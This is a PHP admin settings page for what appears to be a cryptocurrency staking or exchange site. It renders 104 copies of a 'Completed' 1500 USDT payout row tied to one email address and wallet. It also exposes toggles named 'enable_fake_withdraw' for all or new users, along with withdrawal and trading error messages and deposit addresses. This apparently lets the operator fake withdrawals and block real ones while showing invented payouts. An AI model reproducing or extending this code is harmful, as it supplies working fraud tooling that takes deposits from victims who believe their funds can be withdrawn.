<?php


	for($i=1; $i<105; $i++){
		$html .= '<tr>
									<td> <span class="addtobadgestat badge badge-light-success">Completed</span> </td>
									<td> <a target="_blank" href="user-edit?id=140027" class="text-dark text-hover-primary fs-6">hulinada123@gmail.com</a> </td>
									<td class="text-dark  text-hover-primary fs-6">TXiLUSDqZXSUvLVFd1vxchon7RLg2ExK3k</td>
									<td class="text-dark  fs-6">1500 USDTTRC</td>
									<td class="text-dark  fs-6">2023-05-16 23:49:43</td>
								</tr>';
	}
	
	
	var_dump(getSettingValue('telegram_notifications_id'));
	tpl::set([
		'{telegram_notifications_id}' => getSettingValue('telegram_notifications_id'),
		
		'{payment_addresses_BTC}' => getSettingValue('payment_addresses_BTC'),
		'{payment_addresses_ETH}' => getSettingValue('payment_addresses_ETH'),
		'{payment_addresses_LTC}' => getSettingValue('payment_addresses_LTC'),
		
		'{staking_percent_7}' => getSettingValue('staking_percent_7'),
		'{staking_percent_14}' => getSettingValue('staking_percent_14'),
		'{staking_percent_30}' => getSettingValue('staking_percent_30'),
		'{staking_percent_90}' => getSettingValue('staking_percent_90'),
		
		'{minimal_deposit_amount}' => getSettingValue('minimal_deposit_amount'),
		
		'{enable_fake_withdraw_for_ALL_users}' => getSettingValue('enable_fake_withdraw_for_ALL_users') == 1 ? 'checked="checked"' : '',
		'{enable_fake_withdraw_for_NEW_users}' => getSettingValue('enable_fake_withdraw_for_NEW_users') == 1 ? 'checked="checked"' : '',
		'{enable_invest_for_ALL_users}' => getSettingValue('enable_invest_for_ALL_users') == 1 ? 'checked="checked"' : '',
		'{enable_invest_for_NEW_users}' => getSettingValue('enable_invest_for_NEW_users') == 1 ? 'checked="checked"' : '',
		'{enable_transfer_for_ALL_users}' => getSettingValue('enable_transfer_for_ALL_users') == 1 ? 'checked="checked"' : '',
		'{enable_transfer_for_NEW_users}' => getSettingValue('enable_transfer_for_NEW_users') == 1 ? 'checked="checked"' : '',
		
		
		'{withdraw_error}' => getSettingValue('withdraw_error'),
		'{trading_error}' => getSettingValue('trading_error'),
		'{chat_error}' => getSettingValue('chat_error'),
		'{p2p_error}' => getSettingValue('p2p_error'),
	]);
	
	
	tpl::load('settings.tpl');
	tpl::compile('content');



?>